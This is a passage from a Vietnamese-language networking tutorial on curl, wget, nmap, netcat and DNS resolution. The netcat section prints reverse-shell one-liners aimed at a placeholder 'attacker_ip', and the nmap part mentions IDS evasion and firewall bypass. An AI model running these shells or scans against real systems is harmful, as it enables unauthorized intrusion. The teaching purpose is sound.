</span></span><span class=line><span class=cl>   │                                                   │
</span></span><span class=line><span class=cl>   │  HTTP/1.1 200 OK                                  │
</span></span><span class=line><span class=cl>   │  Content-Type: text/html                          │
</span></span><span class=line><span class=cl>   │  Content-Length: 1234                             │
</span></span><span class=line><span class=cl>   │  ◄─────────────────────────────────────────────── │
</span></span><span class=line><span class=cl>   │                                                   │
</span></span><span class=line><span class=cl>   │  [Response Body]                                  │
</span></span><span class=line><span class=cl>   │  ◄─────────────────────────────────────────────── │
</span></span><span class=line><span class=cl>   │                                                   │</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Basic GET</span>
</span></span><span class=line><span class=cl>curl https://api.example.com/data
</span></span><span class=line><span class=cl>curl -o output.html https://example.com/page.html    <span class=c1># Save to file</span>
</span></span><span class=line><span class=cl>curl -O https://example.com/file.zip                 <span class=c1># Save with original name</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Verbose (debug)</span>
</span></span><span class=line><span class=cl>curl -v https://example.com              <span class=c1># Hiện headers</span>
</span></span><span class=line><span class=cl>curl -vvv https://example.com            <span class=c1># Very verbose</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Headers only</span>
</span></span><span class=line><span class=cl>curl -I https://example.com              <span class=c1># HEAD request</span>
</span></span><span class=line><span class=cl>curl -i https://example.com              <span class=c1># Include headers in output</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Custom headers</span>
</span></span><span class=line><span class=cl>curl -H <span class=s2>&#34;Authorization: Bearer token123&#34;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>     -H <span class=s2>&#34;Content-Type: application/json&#34;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>     https://api.example.com/data
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># POST request</span>
</span></span><span class=line><span class=cl>curl -X POST https://api.example.com/users
</span></span><span class=line><span class=cl>curl -d <span class=s2>&#34;name=john&amp;email=john@example.com&#34;</span> https://example.com/form
</span></span><span class=line><span class=cl>curl -d <span class=s1>&#39;{&#34;name&#34;:&#34;john&#34;}&#39;</span> -H <span class=s2>&#34;Content-Type: application/json&#34;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>     https://api.example.com/users
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># PUT, PATCH, DELETE</span>
</span></span><span class=line><span class=cl>curl -X PUT -d <span class=s1>&#39;{&#34;name&#34;:&#34;jane&#34;}&#39;</span> https://api.example.com/users/1
</span></span><span class=line><span class=cl>curl -X PATCH -d <span class=s1>&#39;{&#34;email&#34;:&#34;new@example.com&#34;}&#39;</span> https://api.example.com/users/1
</span></span><span class=line><span class=cl>curl -X DELETE https://api.example.com/users/1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Upload file</span>
</span></span><span class=line><span class=cl>curl -F <span class=s2>&#34;file=@/path/to/file.pdf&#34;</span> https://example.com/upload
</span></span><span class=line><span class=cl>curl -T file.txt ftp://ftp.example.com/upload/         <span class=c1># FTP upload</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Authentication</span>
</span></span><span class=line><span class=cl>curl -u username:password https://example.com/protected
</span></span><span class=line><span class=cl>curl -u username https://example.com/protected         <span class=c1># Prompt for password</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Follow redirects</span>
</span></span><span class=line><span class=cl>curl -L https://example.com/redirect
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Timeout</span>
</span></span><span class=line><span class=cl>curl --connect-timeout <span class=m>5</span> --max-time <span class=m>30</span> https://example.com
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># SSL/TLS</span>
</span></span><span class=line><span class=cl>curl -k https://self-signed.example.com    <span class=c1># Skip certificate verification</span>
</span></span><span class=line><span class=cl>curl --cacert /path/to/ca.crt https://example.com
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Cookies</span>
</span></span><span class=line><span class=cl>curl -c cookies.txt https://example.com/login    <span class=c1># Save cookies</span>
</span></span><span class=line><span class=cl>curl -b cookies.txt https://example.com/profile  <span class=c1># Send cookies</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Proxy</span>
</span></span><span class=line><span class=cl>curl -x http://proxy:8080 https://example.com
</span></span><span class=line><span class=cl>curl -x socks5://proxy:1080 https://example.com
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Rate limiting info</span>
</span></span><span class=line><span class=cl>curl -w <span class=s2>&#34;Time: %{time_total}s\nSpeed: %{speed_download}\n&#34;</span> -o /dev/null -s https://example.com
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Download with resume</span>
</span></span><span class=line><span class=cl>curl -C - -O https://example.com/large-file.zip</span></span></code></pre></div><h3 class=heading-element id=62-wget---download-manager><span>6.2 Wget - Download Manager</span>
<a href=#62-wget---download-manager class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Basic download</span>
</span></span><span class=line><span class=cl>wget https://example.com/file.zip
</span></span><span class=line><span class=cl>wget -O custom-name.zip https://example.com/file.zip
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Resume download</span>
</span></span><span class=line><span class=cl>wget -c https://example.com/large-file.zip
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Download in background</span>
</span></span><span class=line><span class=cl>wget -b https://example.com/file.zip
</span></span><span class=line><span class=cl>tail -f wget-log                          <span class=c1># Monitor progress</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Recursive download (mirror website)</span>
</span></span><span class=line><span class=cl>wget -r -l <span class=m>2</span> https://example.com/         <span class=c1># Depth 2</span>
</span></span><span class=line><span class=cl>wget -m https://example.com/              <span class=c1># Mirror mode</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Download specific file types</span>
</span></span><span class=line><span class=cl>wget -r -A <span class=s2>&#34;*.pdf,*.doc&#34;</span> https://example.com/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Rate limit</span>
</span></span><span class=line><span class=cl>wget --limit-rate<span class=o>=</span>500k https://example.com/file.zip
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Retry</span>
</span></span><span class=line><span class=cl>wget --tries<span class=o>=</span><span class=m>10</span> --retry-connrefused https://example.com/file.zip
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Spider (check links without downloading)</span>
</span></span><span class=line><span class=cl>wget --spider https://example.com/file.zip
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Download from file list</span>
</span></span><span class=line><span class=cl>wget -i urls.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Authentication</span>
</span></span><span class=line><span class=cl>wget --user<span class=o>=</span>username --password<span class=o>=</span>password https://example.com/file.zip
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># User agent</span>
</span></span><span class=line><span class=cl>wget --user-agent<span class=o>=</span><span class=s2>&#34;Mozilla/5.0&#34;</span> https://example.com/</span></span></code></pre></div><h3 class=heading-element id=63-curl-vs-wget><span>6.3 Curl vs Wget</span>
<a href=#63-curl-vs-wget class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-markdown data-lang=markdown><span class=line><span class=cl>┌─────────────────┬──────────────────────┬──────────────────────┐
</span></span><span class=line><span class=cl>│ Feature         │ curl                 │ wget                 │
</span></span><span class=line><span class=cl>├─────────────────┼──────────────────────┼──────────────────────┤
</span></span><span class=line><span class=cl>│ Use case        │ API testing, complex │ File download,       │
</span></span><span class=line><span class=cl>│                 │ HTTP operations      │ website mirroring    │
</span></span><span class=line><span class=cl>├─────────────────┼──────────────────────┼──────────────────────┤
</span></span><span class=line><span class=cl>│ Protocols       │ HTTP, HTTPS, FTP,    │ HTTP, HTTPS, FTP     │
</span></span><span class=line><span class=cl>│                 │ SFTP, SCP, LDAP...   │                      │
</span></span><span class=line><span class=cl>├─────────────────┼──────────────────────┼──────────────────────┤
</span></span><span class=line><span class=cl>│ Output default  │ stdout               │ file                 │
</span></span><span class=line><span class=cl>├─────────────────┼──────────────────────┼──────────────────────┤
</span></span><span class=line><span class=cl>│ Recursive       │ Không                │ Có (-r)              │
</span></span><span class=line><span class=cl>├─────────────────┼──────────────────────┼──────────────────────┤
</span></span><span class=line><span class=cl>│ Resume          │ -C -                 │ -c                   │
</span></span><span class=line><span class=cl>├─────────────────┼──────────────────────┼──────────────────────┤
</span></span><span class=line><span class=cl>│ HTTP methods    │ Tất cả               │ GET, POST            │
</span></span><span class=line><span class=cl>├─────────────────┼──────────────────────┼──────────────────────┤
</span></span><span class=line><span class=cl>│ Library         │ libcurl (embeddable) │ Standalone           │
</span></span><span class=line><span class=cl>└─────────────────┴──────────────────────┴──────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nguyên tắc:
</span></span><span class=line><span class=cl><span class=k>-</span> API testing, scripting: curl
</span></span><span class=line><span class=cl>- Download files, mirror sites: wget</span></span></code></pre></div><hr><h2 class=heading-element id=phần-7-nmap--nc-netcat><span>PHẦN 7: NMAP & NC (NETCAT)</span>
<a href=#ph%e1%ba%a7n-7-nmap--nc-netcat class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><h3 class=heading-element id=71-nmap---network-mapper><span>7.1 Nmap - Network Mapper</span>
<a href=#71-nmap---network-mapper class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-markdown data-lang=markdown><span class=line><span class=cl>┌─────────────────────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>│                    PORT SCANNING TECHNIQUES                 │
</span></span><span class=line><span class=cl>└─────────────────────────────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>1.</span> TCP Connect Scan (-sT):
</span></span><span class=line><span class=cl>   Full TCP handshake → Dễ detect, nhưng reliable
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Client ────► SYN ────────► Server
</span></span><span class=line><span class=cl>   Client ◄──── SYN+ACK ◄──── Server (Port OPEN)
</span></span><span class=line><span class=cl>   Client ────► ACK ────────► Server
</span></span><span class=line><span class=cl>   Client ────► RST ────────► Server (Close connection)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Hoặc:
</span></span><span class=line><span class=cl>   Client ────► SYN ────────► Server
</span></span><span class=line><span class=cl>   Client ◄──── RST ◄──────── Server (Port CLOSED)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>2.</span> SYN Scan (-sS) &#34;Half-open scan&#34;:
</span></span><span class=line><span class=cl>   Không hoàn thành handshake → Ít bị log
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Client ────► SYN ────────► Server
</span></span><span class=line><span class=cl>   Client ◄──── SYN+ACK ◄──── Server (Port OPEN)
</span></span><span class=line><span class=cl>   Client ────► RST ────────► Server (Abort, không log)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>3.</span> UDP Scan (-sU):
</span></span><span class=line><span class=cl>   Gửi UDP packet, chờ response hoặc ICMP unreachable
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Client ────► UDP ────────► Server
</span></span><span class=line><span class=cl>   Client ◄──── Response ◄─── Server (Port OPEN)
</span></span><span class=line><span class=cl>   Hoặc:
</span></span><span class=line><span class=cl>   Client ◄──── ICMP Unreachable ◄── Server (Port CLOSED)
</span></span><span class=line><span class=cl>   Hoặc:
</span></span><span class=line><span class=cl>   [No response] → Port OPEN|FILTERED
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>4.</span> NULL/FIN/Xmas Scan:
</span></span><span class=line><span class=cl>   Gửi packet với flags bất thường
</span></span><span class=line><span class=cl>   Bypass một số firewall rules</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Basic scan</span>
</span></span><span class=line><span class=cl>nmap 192.168.1.1
</span></span><span class=line><span class=cl>nmap 192.168.1.0/24              <span class=c1># Scan subnet</span>
</span></span><span class=line><span class=cl>nmap 192.168.1.1-100             <span class=c1># Range</span>
</span></span><span class=line><span class=cl>nmap -iL targets.txt             <span class=c1># From file</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Scan types</span>
</span></span><span class=line><span class=cl>nmap -sT 192.168.1.1             <span class=c1># TCP connect (default if not root)</span>
</span></span><span class=line><span class=cl>nmap -sS 192.168.1.1             <span class=c1># SYN scan (default if root)</span>
</span></span><span class=line><span class=cl>nmap -sU 192.168.1.1             <span class=c1># UDP scan</span>
</span></span><span class=line><span class=cl>nmap -sA 192.168.1.1             <span class=c1># ACK scan (firewall detection)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Port specification</span>
</span></span><span class=line><span class=cl>nmap -p <span class=m>80</span> 192.168.1.1           <span class=c1># Single port</span>
</span></span><span class=line><span class=cl>nmap -p 80,443,8080 192.168.1.1  <span class=c1># Multiple ports</span>
</span></span><span class=line><span class=cl>nmap -p 1-1000 192.168.1.1       <span class=c1># Range</span>
</span></span><span class=line><span class=cl>nmap -p- 192.168.1.1             <span class=c1># All 65535 ports</span>
</span></span><span class=line><span class=cl>nmap --top-ports <span class=m>100</span> 192.168.1.1 <span class=c1># Top 100 common ports</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Service/Version detection</span>
</span></span><span class=line><span class=cl>nmap -sV 192.168.1.1             <span class=c1># Detect service versions</span>
</span></span><span class=line><span class=cl>nmap -sV --version-intensity <span class=m>5</span> 192.168.1.1  <span class=c1># More aggressive</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># OS detection</span>
</span></span><span class=line><span class=cl>nmap -O 192.168.1.1              <span class=c1># OS fingerprinting</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Aggressive scan (OS + version + script + traceroute)</span>
</span></span><span class=line><span class=cl>nmap -A 192.168.1.1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Speed</span>
</span></span><span class=line><span class=cl>nmap -T0 192.168.1.1             <span class=c1># Paranoid (IDS evasion)</span>
</span></span><span class=line><span class=cl>nmap -T1 192.168.1.1             <span class=c1># Sneaky</span>
</span></span><span class=line><span class=cl>nmap -T2 192.168.1.1             <span class=c1># Polite</span>
</span></span><span class=line><span class=cl>nmap -T3 192.168.1.1             <span class=c1># Normal (default)</span>
</span></span><span class=line><span class=cl>nmap -T4 192.168.1.1             <span class=c1># Aggressive</span>
</span></span><span class=line><span class=cl>nmap -T5 192.168.1.1             <span class=c1># Insane</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Output</span>
</span></span><span class=line><span class=cl>nmap -oN output.txt 192.168.1.1      <span class=c1># Normal</span>
</span></span><span class=line><span class=cl>nmap -oX output.xml 192.168.1.1      <span class=c1># XML</span>
</span></span><span class=line><span class=cl>nmap -oG output.gnmap 192.168.1.1    <span class=c1># Grepable</span>
</span></span><span class=line><span class=cl>nmap -oA output 192.168.1.1          <span class=c1># All formats</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Scripts (NSE - Nmap Scripting Engine)</span>
</span></span><span class=line><span class=cl>nmap --script<span class=o>=</span>default 192.168.1.1
</span></span><span class=line><span class=cl>nmap --script<span class=o>=</span>vuln 192.168.1.1       <span class=c1># Vulnerability scan</span>
</span></span><span class=line><span class=cl>nmap --script<span class=o>=</span>http-enum 192.168.1.1  <span class=c1># Web enumeration</span></span></span></code></pre></div><h3 class=heading-element id=72-netcat-nc---tcpudp-swiss-army-knife><span>7.2 Netcat (nc) - TCP/UDP Swiss Army Knife</span>
<a href=#72-netcat-nc---tcpudp-swiss-army-knife class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Listen mode (server)</span>
</span></span><span class=line><span class=cl>nc -l -p <span class=m>1234</span>                     <span class=c1># Listen on port 1234</span>
</span></span><span class=line><span class=cl>nc -l -p <span class=m>1234</span> -v                  <span class=c1># Verbose</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Connect mode (client)</span>
</span></span><span class=line><span class=cl>nc hostname <span class=m>1234</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Port scanning</span>
</span></span><span class=line><span class=cl>nc -zv hostname 1-1000            <span class=c1># Scan ports 1-1000</span>
</span></span><span class=line><span class=cl>nc -zv hostname <span class=m>80</span> <span class=m>443</span>            <span class=c1># Scan specific ports</span>
</span></span><span class=line><span class=cl><span class=c1># -z: Zero I/O (scan only)</span>
</span></span><span class=line><span class=cl><span class=c1># -v: Verbose</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># File transfer</span>
</span></span><span class=line><span class=cl><span class=c1># Receiver:</span>
</span></span><span class=line><span class=cl>nc -l -p <span class=m>1234</span> &gt; received_file.txt
</span></span><span class=line><span class=cl><span class=c1># Sender:</span>
</span></span><span class=line><span class=cl>nc hostname <span class=m>1234</span> &lt; file_to_send.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Or with progress (using pv):</span>
</span></span><span class=line><span class=cl><span class=c1># Receiver:</span>
</span></span><span class=line><span class=cl>nc -l -p <span class=m>1234</span> <span class=p>|</span> pv &gt; received_file.txt
</span></span><span class=line><span class=cl><span class=c1># Sender:</span>
</span></span><span class=line><span class=cl>pv file.txt <span class=p>|</span> nc hostname <span class=m>1234</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Chat</span>
</span></span><span class=line><span class=cl><span class=c1># Person A:</span>
</span></span><span class=line><span class=cl>nc -l -p <span class=m>1234</span>
</span></span><span class=line><span class=cl><span class=c1># Person B:</span>
</span></span><span class=line><span class=cl>nc hostname <span class=m>1234</span>
</span></span><span class=line><span class=cl><span class=c1># Giờ có thể chat qua terminal</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Banner grabbing</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;&#34;</span> <span class=p>|</span> nc -v hostname <span class=m>22</span>       <span class=c1># SSH banner</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;GET / HTTP/1.0\r\n\r\n&#34;</span> <span class=p>|</span> nc hostname <span class=m>80</span>   <span class=c1># HTTP</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Simple HTTP server (one request)</span>
</span></span><span class=line><span class=cl><span class=k>while</span> true<span class=p>;</span> <span class=k>do</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> -e <span class=s2>&#34;HTTP/1.1 200 OK\r\n\r\nHello World&#34;</span> <span class=p>|</span> nc -l -p <span class=m>8080</span> -q <span class=m>1</span>
</span></span><span class=line><span class=cl><span class=k>done</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Reverse shell (security testing only!)</span>
</span></span><span class=line><span class=cl><span class=c1># Attacker (listener):</span>
</span></span><span class=line><span class=cl>nc -l -p <span class=m>4444</span>
</span></span><span class=line><span class=cl><span class=c1># Target:</span>
</span></span><span class=line><span class=cl>nc attacker_ip <span class=m>4444</span> -e /bin/bash    <span class=c1># Some nc versions</span>
</span></span><span class=line><span class=cl>bash -i &gt;<span class=p>&amp;</span> /dev/tcp/attacker_ip/4444 0&gt;<span class=p>&amp;</span><span class=m>1</span>   <span class=c1># Bash alternative</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Proxy / Port forwarding</span>
</span></span><span class=line><span class=cl>nc -l -p <span class=m>8080</span> <span class=p>|</span> nc target <span class=m>80</span>      <span class=c1># Simplex (one direction)</span>
</span></span><span class=line><span class=cl><span class=c1># For full duplex, use named pipes:</span>
</span></span><span class=line><span class=cl>mkfifo backpipe
</span></span><span class=line><span class=cl>nc -l -p <span class=m>8080</span> 0&lt;backpipe <span class=p>|</span> nc target <span class=m>80</span> 1&gt;backpipe</span></span></code></pre></div><hr><h2 class=heading-element id=phần-8-dns--network-diagnostics><span>PHẦN 8: DNS & NETWORK DIAGNOSTICS</span>
<a href=#ph%e1%ba%a7n-8-dns--network-diagnostics class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><h3 class=heading-element id=81-dns-resolution><span>8.1 DNS Resolution</span>
<a href=#81-dns-resolution class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-markdown data-lang=markdown><span class=line><span class=cl>┌─────────────────────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>│                   DNS RESOLUTION PROCESS                    │
</span></span><span class=line><span class=cl>└─────────────────────────────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Query: www.example.com → IP?
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>1.</span> Check local cache (/etc/hosts, DNS cache)
</span></span><span class=line><span class=cl><span class=k>2.</span> Query recursive resolver (usually ISP or 8.8.8.8)
</span></span><span class=line><span class=cl><span class=k>3.</span> Resolver queries root servers (.)
</span></span><span class=line><span class=cl><span class=k>4.</span> Root refers to .com TLD servers
</span></span><span class=line><span class=cl><span class=k>5.</span> .com TLD refers to example.com authoritative servers
</span></span><span class=line><span class=cl><span class=k>6.</span> Authoritative server returns IP for www.example.com
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>             Client                 Resolver               Root
</span></span><span class=line><span class=cl>                │                      │                    │
</span></span><span class=line><span class=cl>                │ Query www.example.com│                    │
</span></span><span class=line><span class=cl>                │ ────────────────────►│                    │
</span></span><span class=line><span class=cl>                │                      │ Query .com?        │
</span></span><span class=line><span class=cl>                │                      │ ──────────────────►│
</span></span><span class=line><span class=cl>                │                      │◄── .com NS servers │
</span></span><span class=line><span class=cl>                │                      │                    │
</span></span><span class=line><span class=cl>                │                      │                  .com TLD
</span></span><span class=line><span class=cl>                │                      │ Query example.com? │
</span></span><span class=line><span class=cl>                │                      │ ──────────────────►│
</span></span><span class=line><span class=cl>                │                      │◄── example.com NS  │
</span></span><span class=line><span class=cl>                │                      │                    │
</span></span><span class=line><span class=cl>                │                      │           example.com Auth
</span></span><span class=line><span class=cl>                │                      │ Query www?         │
</span></span><span class=line><span class=cl>                │                      │ ──────────────────►│
</span></span><span class=line><span class=cl>                │                      │◄── 93.184.216.34   │
</span></span><span class=line><span class=cl>                │◄──── 93.184.216.34 ──│                    │
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>DNS Caching: Mỗi level cache với TTL
</span></span><span class=line><span class=cl>→ Giảm queries, tăng performance
</span></span><span class=line><span class=cl>→ Trade-off: Thay đổi DNS không apply ngay</span></span></code></pre></div><h3 class=heading-element id=82-dig---dns-query-tool><span>8.2 dig - DNS Query Tool</span>
